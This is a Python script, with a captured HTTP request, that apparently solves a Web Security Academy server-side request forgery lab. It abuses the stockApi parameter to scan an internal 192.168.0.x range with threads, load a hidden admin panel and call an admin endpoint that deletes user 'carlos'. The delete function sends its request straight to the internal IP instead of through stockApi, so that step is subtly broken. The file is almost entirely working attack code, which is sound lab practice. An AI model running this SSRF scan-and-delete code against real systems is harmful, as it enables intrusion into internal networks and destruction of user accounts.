'''
POST /product/stock HTTP/2
Host: 0af100710329467582072e45000800d8.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0af100710329467582072e45000800d8.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: https://0af100710329467582072e45000800d8.web-security-academy.net
Connection: keep-alive
Cookie: session=po1UB98z9j8C5P4XSewIm6wOVcsOCVNh
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
TE: trailers

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
'''

import requests
import threading

DOMAIN = "0af100710329467582072e45000800d8.web-security-academy.net"
URL = f"https://{DOMAIN}/product/stock"

headers = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": f"https://{DOMAIN}/product?productId=1",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "TE": "trailers"
}

cookies = {
    "session": "po1UB98z9j8C5P4XSewIm6wOVcsOCVNh"
}

def enum_internal_network(from_ip=1, to_ip=255):
    correct_ips = []
    for i in range(from_ip, to_ip):
        data = {
            "stockApi": f"http://192.168.0.{i}:8080/admin"
        }
        response = requests.post(URL, headers=headers, cookies=cookies, data=data)

        print(f"Trying internal IP: 192.168.0.{i}", " | ", response.status_code)
        if response.status_code == 200:
            correct_ips.append(i)
            print(f"Found internal IP: 192.168.0.{i}")

    return correct_ips

def interacte_with_admin_panel():
    ip = "192.168.0.35"
    data = {
        "stockApi": f"http://{ip}:8080/admin"
    }
    response = requests.post(URL, headers=headers, cookies=cookies, data=data)

    print(response.text)

def delete_user_account():
    response = requests.get("http://192.168.0.35:8080/admin/delete?username=carlos", headers=headers, cookies=cookies)
    print(response.text)

def multi_threading_enum():
    t1 = threading.Thread(target=enum_internal_network, args=(1, 64))
    t2 = threading.Thread(target=enum_internal_network, args=(65, 128))
    t3 = threading.Thread(target=enum_internal_network, args=(129, 192))
    t4 = threading.Thread(target=enum_internal_network, args=(193, 255))

    t1.start()
    t2.start()
    t3.start()
    t4.start()

    t1.join()
    t2.join()
    t3.join()
    t4.join()

    print("Done")

# delete_user_account()
# interacte_with_admin_panel()